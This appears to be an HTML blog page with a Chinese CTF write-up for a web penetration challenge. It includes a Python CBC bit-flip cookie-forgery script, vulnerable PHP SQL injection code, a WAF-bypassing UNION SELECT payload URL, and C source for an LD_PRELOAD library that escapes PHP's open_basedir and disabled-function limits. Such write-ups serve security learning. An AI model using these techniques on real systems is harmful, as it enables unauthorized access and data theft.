@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>三个白帽之招聘又开始了，你怕了吗？-Writeup | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这周的三个白帽题听说是前几天ALICTF的招聘题延续，上次两题都没撸出来，这次给了源码终于撸出来了。">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="三个白帽之招聘又开始了，你怕了吗？-Writeup">
+<meta property="og:url" content="http://0x48.pw/2016/06/17/0x1C/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="这周的三个白帽题听说是前几天ALICTF的招聘题延续，上次两题都没撸出来，这次给了源码终于撸出来了。">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/sanmao.png">
+<meta property="og:updated_time" content="2016-08-10T13:13:49.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="三个白帽之招聘又开始了，你怕了吗？-Writeup">
+<meta name="twitter:description" content="这周的三个白帽题听说是前几天ALICTF的招聘题延续，上次两题都没撸出来，这次给了源码终于撸出来了。">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/sanmao.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x1C" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/06/17/0x1C/" class="article-date">
+      <time datetime="2016-06-17T07:14:27.000Z" itemprop="datePublished">2016-06-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      三个白帽之招聘又开始了，你怕了吗？-Writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>这周的三个白帽题听说是前几天ALICTF的招聘题延续，上次两题都没撸出来，这次给了源码终于撸出来了。<br><a id="more"></a></p>
+<p>该渗透题有三个大坑</p>
+<h1 id="坑1-CBC攻击"><a href="#坑1-CBC攻击" class="headerlink" title="坑1: CBC攻击"></a>坑1: CBC攻击</h1><p>很简单的CBC攻击，上次google ctf中出现过，我也写过wp:<a href="http://0x48.pw/2016/05/03/0x1A/">http://0x48.pw/2016/05/03/0x1A/</a></p>
+<p>直接贴脚本吧：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_captcha</span><span class="params">(s)</span>:</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">10000000</span>):</div><div class="line">		y = hashlib.md5(str(x)).hexdigest()</div><div class="line">		<span class="keyword">if</span> y[:<span class="number">4</span>] == s:</div><div class="line">			<span class="keyword">return</span> str(x)</div><div class="line">	<span class="keyword">print</span> <span class="string">"God personality.(%s)"</span> %s</div><div class="line">	exit(<span class="number">1</span>)</div><div class="line"></div><div class="line"></div><div class="line">url = <span class="string">"http://451bf8ea3268360ee.jie.sangebaimao.com/login.php"</span></div><div class="line">url2 = <span class="string">"http://451bf8ea3268360ee.jie.sangebaimao.com"</span></div><div class="line"></div><div class="line">req = requests.get(url)</div><div class="line"></div><div class="line">c = req.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">";"</span>)[<span class="number">0</span>]</div><div class="line">c = c.split(<span class="string">"="</span>)</div><div class="line">cookie = &#123;c[<span class="number">0</span>]: c[<span class="number">1</span>]&#125;</div><div class="line"></div><div class="line">cap = re.findall(<span class="string">"=([a-f0-9]&#123;4&#125;)"</span>, req.content)[<span class="number">0</span>]</div><div class="line">captcha = fuck_captcha(cap)</div><div class="line"></div><div class="line">data = &#123;<span class="string">"username"</span>: <span class="string">"ddmin"</span>, <span class="string">"password"</span>: <span class="string">"ddog"</span>, <span class="string">"captcha"</span>: captcha&#125;</div><div class="line">req = requests.post(url, data=data, cookies=cookie, allow_redirects=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">c = req.headers[<span class="string">'Set-Cookie'</span>]</div><div class="line"></div><div class="line">user = c.split(<span class="string">"="</span>)[<span class="number">1</span>]</div><div class="line"></div><div class="line">u = user.replace(<span class="string">"-"</span>, <span class="string">"+"</span>).replace(<span class="string">"_"</span>, <span class="string">"/"</span>)</div><div class="line">u += <span class="string">"="</span> * (len(u) % <span class="number">4</span>)</div><div class="line"></div><div class="line">de = base64.b64decode(u)</div><div class="line">de2 = chr(ord(de[<span class="number">0</span>]) ^ ord(<span class="string">'d'</span>) ^ ord(<span class="string">'a'</span>)) + de[<span class="number">1</span>:]</div><div class="line"></div><div class="line">en = base64.b64encode(de2).replace(<span class="string">"+"</span>, <span class="string">"-"</span>).replace(<span class="string">"/"</span>, <span class="string">"_"</span>).replace(<span class="string">"="</span>, <span class="string">""</span>)</div><div class="line"><span class="comment"># cookie = &#123;"username": en&#125;</span></div><div class="line"><span class="comment"># req = requests.get(url, cookies=cookie)</span></div><div class="line"><span class="keyword">print</span> en</div><div class="line"><span class="comment"># 输出的en为admin的cookie</span></div></pre></td></tr></table></figure></p>
+<p>第一个坑的CBC攻击好几种方法，还可以构造任意字符，所以在这存在注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// index.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line">* <span class="doctag">@author</span> firesun </div><div class="line">* <span class="doctag">@website</span> https://github.com/firesunCN</div><div class="line">*/</div><div class="line"><span class="keyword">require_once</span>(<span class="string">"header.php"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) || decrypt($_COOKIE[<span class="string">'username'</span>]) === <span class="string">""</span>) &#123;</div><div class="line">    setcookie(<span class="string">"username"</span>);</div><div class="line">	header(<span class="string">"Location: login.php"</span>);</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sql=<span class="string">"select * from user where username='"</span>.decrypt($_COOKIE[<span class="string">'username'</span>]).<span class="string">"';"</span>;</div></pre></td></tr></table></figure></p>
+<p>因为cookie的值是base编码过的，所以waf并没有用，不过这注入太麻烦了，建议还是踩第二个坑.</p>
+<h1 id="坑2-绕waf"><a href="#坑2-绕waf" class="headerlink" title="坑2: 绕waf"></a>坑2: 绕waf</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// admin/user.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line">* <span class="doctag">@author</span> firesun </div><div class="line">* <span class="doctag">@website</span> https://github.com/firesunCN</div><div class="line">*/</div><div class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_REQUEST[<span class="string">"id"</span>])) &#123;</div><div class="line">	header(<span class="string">"Location: index.php"</span>);</div><div class="line">	<span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$sql=<span class="string">"select * from user where id="</span>.$_REQUEST[<span class="string">"id"</span>].<span class="string">";"</span>;</div></pre></td></tr></table></figure>
+<p>这很明显是注入，不过却上了waf，表示这waf怼不动，哪位师傅怼得动？求教！</p>
+<p>waf虽然怼不动，不过却有其他问题，在waf.php的76-85行对uri的处理有问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$uri = explode(<span class="string">"?"</span>,$_SERVER[<span class="string">'REQUEST_URI'</span>]);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uri[<span class="number">1</span>])) &#123;</div><div class="line">	$parameter = explode(<span class="string">"&amp;"</span>,$uri[<span class="number">1</span>]);</div><div class="line">	<span class="keyword">foreach</span> ($parameter <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">		$v1 = explode(<span class="string">"="</span>,$v);</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($v1[<span class="number">1</span>])) &#123;</div><div class="line">			$_REQUEST[$v1[<span class="number">0</span>]] = stripStr($v1[<span class="number">1</span>]);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>提出来本地测试一下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripStr</span><span class="params">($str)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (get_magic_quotes_gpc())</div><div class="line">        $str = stripslashes($str);</div><div class="line">    <span class="keyword">return</span> addslashes(htmlspecialchars($str, ENT_QUOTES, <span class="string">'UTF-8'</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">'$_REQUEST value is: '</span>;</div><div class="line">var_dump($_REQUEST);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;$_GET value is: '</span>;</div><div class="line">var_dump($_GET);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;$uri value is: '</span>;</div><div class="line">$uri = explode(<span class="string">"?"</span>,$_SERVER[<span class="string">'REQUEST_URI'</span>]);</div><div class="line">var_dump($uri);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>.<span class="string">'now the $_REQUEST value is: '</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uri[<span class="number">1</span>])) &#123;</div><div class="line">	$parameter = explode(<span class="string">"&amp;"</span>,$uri[<span class="number">1</span>]);</div><div class="line">	<span class="keyword">foreach</span> ($parameter <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">		$v1 = explode(<span class="string">"="</span>,$v);</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($v1[<span class="number">1</span>])) &#123;</div><div class="line">			$_REQUEST[$v1[<span class="number">0</span>]] = stripStr($v1[<span class="number">1</span>]);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var_dump($_REQUEST);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>访问：<code>http://127.0.0.1/test/test.php?id=2?&amp;id=3</code><br>输出：<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$_REQUEST <span class="keyword">value</span> is: <span class="built_in">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="built_in">string</span>(<span class="number">1</span>) <span class="string">"3"</span> &#125;</div><div class="line">$_GET <span class="keyword">value</span> is: <span class="built_in">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="built_in">string</span>(<span class="number">1</span>) <span class="string">"3"</span> &#125;</div><div class="line">$uri <span class="keyword">value</span> is: <span class="built_in">array</span>(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="built_in">string</span>(<span class="number">14</span>) <span class="string">"/test/test.php"</span> [<span class="number">1</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">"id=2"</span> [<span class="number">2</span>]=&gt; <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">"&amp;id=3"</span> &#125;</div><div class="line">now the $_REQUEST <span class="keyword">value</span> is: <span class="built_in">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="built_in">string</span>(<span class="number">1</span>) <span class="string">"2"</span> &#125;</div></pre></td></tr></table></figure></p>
+<p>所以根本不需要怼waf，uri被处理后，$_GET和$_REQUEST的值可以不一样，然后直接注入就好了</p>
+<p>payload: <code>http://451bf8ea3268360ee.jie.sangebaimao.com/admin/user.php?id=-1/**/union/**/select/**/1,2,3,(select/**/content/**/from/**/memo),5?&amp;id=3</code></p>
+<p>得到信息:<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/NQTGmhlG3im8PUcsO2GgMCieThLtbqi4.php</div><div class="line">password:firesun</div><div class="line">flag <span class="keyword">is</span> <span class="keyword">at</span> /.</div></pre></td></tr></table></figure></p>
+<p>然后就是最后一步了</p>
+<h1 id="坑3-bypass-open-basedir"><a href="#坑3-bypass-open-basedir" class="headerlink" title="坑3: bypass open_basedir"></a>坑3: bypass open_basedir</h1><p>给的信息一看就知道是webshell, 先开AntSword连马，发现啥也干不了，看了看phpinfo()，发现ban了一堆函数，看着咋这么熟悉……这不是ALICTF的homework么，出题人也都是firesun师傅. </p>
+<p>首先看看能不能写文件，写文件的方法是从homework想出来的，使用<code>move_uploaded_file</code>，文件上传的函数写到<code>/tmp</code>目录下，读文件通过<code>highlight_file</code>或者<code>show_source</code>这类函数, 这里还有一个小坑，上传到<code>/tmp</code>目录的文件会被秒删，我们秒读就好了.</p>
+<p>bypass open_basedir方法链接: <a href="http://drops.wooyun.org/tips/16054" target="_blank" rel="external">http://drops.wooyun.org/tips/16054</a></p>
+<p>不过和homework一样，服务器的命令基本都被ban了(像啥nc, cat, python，ls)全被ban了，所以按照homework的套路，用C来读目录和文件</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//ddog.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</div><div class="line">	<span class="comment">//DIR *dirp;</span></div><div class="line">	<span class="comment">//struct dirent *dp;</span></div><div class="line">	FILE *fp, *fp2;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</div><div class="line">	<span class="comment">//dirp = opendir("/");  //flag在/目录下</span></div><div class="line">	fp = fopen(<span class="string">"/tmp/tteesstt"</span>, <span class="string">"w"</span>);</div><div class="line">	fp2 = fopen(<span class="string">"/flag_gei_ni_ni_Ye_du_bu_LIAO"</span>, <span class="string">"r"</span>);</div><div class="line">	fgets(buf, <span class="number">100</span>, fp2);</div><div class="line">	<span class="built_in">fputs</span>(buf, fp);</div><div class="line">	<span class="comment">//while ((dp = readdir(dirp)) != NULL) &#123;</span></div><div class="line">	<span class="comment">//	fputs(dp-&gt;d_name, fp);    //得到/flag_gei_ni_ni_Ye_du_bu_LIAO文件路径</span></div><div class="line">	<span class="comment">//&#125;</span></div><div class="line">	fclose(fp);</div><div class="line">	fclose(fp2);</div><div class="line">	<span class="comment">//closedir(dirp);</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	unsetenv(<span class="string">"LD_PRELOAD"</span>);</div><div class="line">	payload();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>编译成so库<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> gcc -c <span class="_">-f</span>PIC ddog.c -o ddog</span></div><div class="line"><span class="meta">$</span><span class="bash"> gcc -shared ddog -o ddog.so</span></div></pre></td></tr></table></figure></p>
+<p>得到<code>ddog.so</code>，上传到<code>/tmp</code>，读文件信息一条龙:<br><img src="http://qn.lazysheep.cc/img/sanmao.png" alt="sanmao"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-06-17, 15:14:27</p>
+        <p><span>最后更新:</span>2016-08-10, 21:13:49</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/06/17/0x1C/" title="三个白帽之招聘又开始了，你怕了吗？-Writeup">http://0x48.pw/2016/06/17/0x1C/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/06/17/0x1C/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/06/27/0x1D/">
+                    寻找来自星星的你第二期Writeup
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/05/10/0x1B/">
+                    SCTF Code Writeup
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#坑1-CBC攻击"><span class="toc-number">1.</span> <span class="toc-text">坑1: CBC攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#坑2-绕waf"><span class="toc-number">2.</span> <span class="toc-text">坑2: 绕waf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#坑3-bypass-open-basedir"><span class="toc-number">3.</span> <span class="toc-text">坑3: bypass open_basedir</span></a></li></ol>
+</div>
+<style>
